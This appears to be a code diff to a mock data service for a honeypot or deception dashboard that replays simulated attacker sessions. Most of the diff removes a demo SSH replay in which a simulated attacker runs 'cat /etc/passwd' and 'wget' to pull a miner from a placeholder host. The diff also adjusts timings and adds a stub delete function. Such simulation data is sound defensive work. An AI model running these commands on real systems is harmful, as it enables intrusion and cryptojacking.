@@ -1,4 +1,6 @@
 
+
+
 import { Actor, ActorStatus, LogEntry, LogLevel, ProxyGateway, CloudTrap, ActiveTunnel, PendingActor, ProvisioningStatus, DevicePersona, WifiNetwork, BluetoothDevice, ForensicSnapshot, ForensicProcess, AttackSession } from '../types';
 
 const LOCATIONS = ['Tel Aviv HQ', 'New York Branch', 'London DC', 'Frankfurt AWS'];
@@ -617,89 +619,11 @@ export const performForensicScan = async (actorId: string, mockContext?: Actor):
 };
 
 // --- NEW: GHOST MODE (SESSION REPLAY) ---
-
 export const getAttackSessions = async (actorId: string, actorContext?: Actor): Promise<AttackSession[]> => {
     return new Promise((resolve) => {
         setTimeout(() => {
              const sessions: AttackSession[] = [];
              
-             // 1. Static SSH Session (Always present for demo)
-             sessions.push({
-                 id: 'sess-ssh-10293',
-                 actorId,
-                 attackerIp: '185.220.101.43',
-                 protocol: 'SSH',
-                 startTime: new Date(Date.now() - 3600000), // 1 hour ago
-                 durationSeconds: 15,
-                 frames: [
-                     { time: 500, type: 'OUTPUT', data: 'Linux raspberrypi 5.15.32-v7+ #1538 SMP Thu Mar 31 19:38:48 BST 2022 armv7l\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Thu Oct 12 03:01:22 2023 from 10.0.0.5\n' },
-                     { time: 1000, type: 'OUTPUT', data: 'pi@raspberrypi:~$ ' },
-                     { time: 1500, type: 'INPUT', data: 'w' },
-                     { time: 1600, type: 'INPUT', data: 'h' },
-                     { time: 1700, type: 'INPUT', data: 'o' },
-                     { time: 1800, type: 'INPUT', data: 'a' },
-                     { time: 1900, type: 'INPUT', data: 'm' },
-                     { time: 2000, type: 'INPUT', data: 'i' },
-                     { time: 2200, type: 'OUTPUT', data: 'whoami' },
-                     { time: 2250, type: 'OUTPUT', data: '\n' },
-                     { time: 2300, type: 'OUTPUT', data: 'root\n' },
-                     { time: 2350, type: 'OUTPUT', data: 'pi@raspberrypi:~$ ' },
-                     { time: 3500, type: 'INPUT', data: 'c' },
-                     { time: 3600, type: 'INPUT', data: 'a' },
-                     { time: 3700, type: 'INPUT', data: 't' },
-                     { time: 3800, type: 'INPUT', data: ' ' },
-                     { time: 3900, type: 'INPUT', data: '/' },
-                     { time: 4000, type: 'INPUT', data: 'e' },
-                     { time: 4100, type: 'INPUT', data: 't' },
-                     { time: 4200, type: 'INPUT', data: 'c' },
-                     { time: 4300, type: 'INPUT', data: '/' },
-                     { time: 4400, type: 'INPUT', data: 'p' },
-                     { time: 4500, type: 'INPUT', data: 'a' },
-                     { time: 4600, type: 'INPUT', data: 's' },
-                     { time: 4700, type: 'INPUT', data: 's' },
-                     { time: 4800, type: 'INPUT', data: 'w' },
-                     { time: 4900, type: 'INPUT', data: 'd' },
-                     { time: 5100, type: 'OUTPUT', data: 'cat /etc/passwd\n' },
-                     { time: 5200, type: 'OUTPUT', data: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\npi:x:1000:1000:,,,:/home/pi:/bin/bash\n' },
-                     { time: 5300, type: 'OUTPUT', data: 'pi@raspberrypi:~$ ' },
-                     { time: 7000, type: 'INPUT', data: 'w' },
-                     { time: 7100, type: 'INPUT', data: 'g' },
-                     { time: 7200, type: 'INPUT', data: 'e' },
-                     { time: 7300, type: 'INPUT', data: 't' },
-                     { time: 7400, type: 'INPUT', data: ' ' },
-                     { time: 7500, type: 'INPUT', data: 'h' },
-                     { time: 7600, type: 'INPUT', data: 't' },
-                     { time: 7700, type: 'INPUT', data: 't' },
-                     { time: 7800, type: 'INPUT', data: 'p' },
-                     { time: 7900, type: 'INPUT', data: ':' },
-                     { time: 8000, type: 'INPUT', data: '/' },
-                     { time: 8100, type: 'INPUT', data: '/' },
-                     { time: 8200, type: 'INPUT', data: '1' },
-                     { time: 8300, type: 'INPUT', data: '8' },
-                     { time: 8400, type: 'INPUT', data: '5' },
-                     { time: 8500, type: 'INPUT', data: '.' },
-                     { time: 8600, type: 'INPUT', data: 'x' },
-                     { time: 8700, type: 'INPUT', data: '.' },
-                     { time: 8800, type: 'INPUT', data: 'x' },
-                     { time: 8900, type: 'INPUT', data: '.' },
-                     { time: 9000, type: 'INPUT', data: 'x' },
-                     { time: 9100, type: 'INPUT', data: '/' },
-                     { time: 9200, type: 'INPUT', data: 'm' },
-                     { time: 9300, type: 'INPUT', data: 'i' },
-                     { time: 9400, type: 'INPUT', data: 'n' },
-                     { time: 9500, type: 'INPUT', data: 'e' },
-                     { time: 9600, type: 'INPUT', data: 'r' },
-                     { time: 9800, type: 'OUTPUT', data: 'wget http://185.x.x.x/miner\n' },
-                     { time: 10500, type: 'OUTPUT', data: '--2023-10-12 04:05:01--  http://185.x.x.x/miner\nConnecting to 185.x.x.x:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 45021 (44K) [application/octet-stream]\nSaving to: ‘miner’\n\nminer               100%[===================>]  43.97K  --.-KB/s    in 0.08s   \n\n2023-10-12 04:05:01 (560 KB/s) - ‘miner’ saved [45021/45021]\n' },
-                     { time: 10600, type: 'OUTPUT', data: 'pi@raspberrypi:~$ ' },
-                     { time: 12000, type: 'INPUT', data: 'e' },
-                     { time: 12100, type: 'INPUT', data: 'x' },
-                     { time: 12200, type: 'INPUT', data: 'i' },
-                     { time: 12300, type: 'INPUT', data: 't' },
-                     { time: 12500, type: 'OUTPUT', data: 'exit\nlogout\nConnection closed.' }
-                 ]
-             });
-
              // 2. Dynamic Traps (Real-time generation from context)
              if (actorContext && actorContext.activeTunnels) {
                  actorContext.activeTunnels.forEach(t => {
@@ -712,7 +636,7 @@ export const getAttackSessions = async (actorId: string, actorContext?: Actor): 
                             actorId,
                             attackerIp: fakeIp,
                             protocol: 'FTP',
-                            startTime: new Date(Date.now() - Math.random() * 100000), // Recent
+                            startTime: new Date(Date.now() - Math.random() * 60000), // Very Recent (last 60s)
                             durationSeconds: 5,
                             frames: [
                                 { time: 100, type: 'OUTPUT', data: '220 (vsFTPd 2.3.4)\r\n' },
@@ -730,7 +654,7 @@ export const getAttackSessions = async (actorId: string, actorContext?: Actor): 
                             actorId,
                             attackerIp: fakeIp,
                             protocol: 'REDIS',
-                            startTime: new Date(Date.now() - Math.random() * 100000), // Recent
+                            startTime: new Date(Date.now() - Math.random() * 60000), // Very Recent (last 60s)
                             durationSeconds: 4,
                             frames: [
                                 { time: 100, type: 'INPUT', data: 'CONFIG GET *\r\n' },
@@ -745,6 +669,13 @@ export const getAttackSessions = async (actorId: string, actorContext?: Actor): 
              }
              
              resolve(sessions);
-        }, 1000);
+        }, 800);
     });
+};
+
+export const deleteAttackSession = async (sessionId: string): Promise<boolean> => {
+    // In mock, we just pretend it succeeded. 
+    // In a real implementation, this would delete from DB.
+    // The frontend handles the immediate removal from UI state.
+    return new Promise(resolve => setTimeout(() => resolve(true), 200));
 };
